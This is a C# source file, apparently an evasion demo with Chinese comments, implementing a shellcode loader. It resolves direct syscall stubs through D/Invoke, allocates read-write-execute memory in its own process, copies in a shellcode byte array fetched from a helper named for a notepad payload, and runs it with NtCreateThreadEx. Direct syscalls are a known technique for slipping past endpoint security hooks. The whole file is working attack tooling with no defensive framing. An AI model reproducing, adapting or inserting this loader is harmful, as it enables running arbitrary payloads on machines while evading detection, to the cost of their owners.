using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace D_Invoke_syscall
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] notepadShellcode_x64 = MessyTools.Tools.getSc();
            Native.NTSTATUS ntstatu;


            IntPtr hProcess = Native.GetCurrentProcess(); // 进程句柄，当前进程为-1
            IntPtr BaseAddress = IntPtr.Zero; // 接收分配的内存地址
            IntPtr ZeroBits = IntPtr.Zero;
            IntPtr RegionSize = new IntPtr(Convert.ToUInt32(notepadShellcode_x64.Length)); // 申请的内存大小
            Native.AllocationType AllocationType = Native.AllocationType.Commit | Native.AllocationType.Reserve; // 分配类型
            uint Protect = (uint)Native.AllocationProtect.PAGE_EXECUTE_READWRITE; // 内存权限：读写执行

            IntPtr sysPointer = Generic.GetSyscallStub("NtAllocateVirtualMemory");
            Delegates.NtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(sysPointer, typeof(Delegates.NtAllocateVirtualMemory)) as Delegates.NtAllocateVirtualMemory;
            ntstatu = NtAllocateVirtualMemory(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            Console.WriteLine($"NtAllocateVirtualMemory -> {ntstatu}");
            Console.WriteLine($"申请的内存地址 -> 0x{BaseAddress.ToString("X")}");


            // 把notepadShellcode复制到申请的BaseAddress内存
            Marshal.Copy(notepadShellcode_x64, 0, BaseAddress, notepadShellcode_x64.Length);


            IntPtr hThread = IntPtr.Zero; // 接收线程句柄
            Native.ACCESS_MASK DesiredAccess = Native.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Native.ACCESS_MASK.STANDARD_RIGHTS_ALL; // 访问权限
            IntPtr ObjectAttributes = IntPtr.Zero;
            IntPtr lpParameter = IntPtr.Zero;
            bool CreateSuspended = false; // 是否挂起
            uint StackZeroBits = 0;
            uint SizeOfStackCommit = 0xFFFF; // 65535
            uint SizeOfStackReserve = 0xFFFF; // 65535
            IntPtr lpBytesBuffer = IntPtr.Zero;

            sysPointer = Generic.GetSyscallStub("NtCreateThreadEx");
            Delegates.NtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(sysPointer, typeof(Delegates.NtCreateThreadEx)) as Delegates.NtCreateThreadEx;
            ntstatu = NtCreateThreadEx(out hThread, DesiredAccess, ObjectAttributes, hProcess, BaseAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
            Console.WriteLine($"NtCreateThreadEx -> {ntstatu}\nThread Id -> {Native.GetThreadId(hThread)}");


            Console.WriteLine(new Win32Exception());


            sysPointer = Generic.GetSyscallStub("NtWaitForSingleObject");
            Delegates.NtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(sysPointer, typeof(Delegates.NtWaitForSingleObject)) as Delegates.NtWaitForSingleObject;
            ntstatu = NtWaitForSingleObject(hThread, false, 0);
            Console.WriteLine($"NtWaitForSingleObject -> {ntstatu}");
        }
    }

}
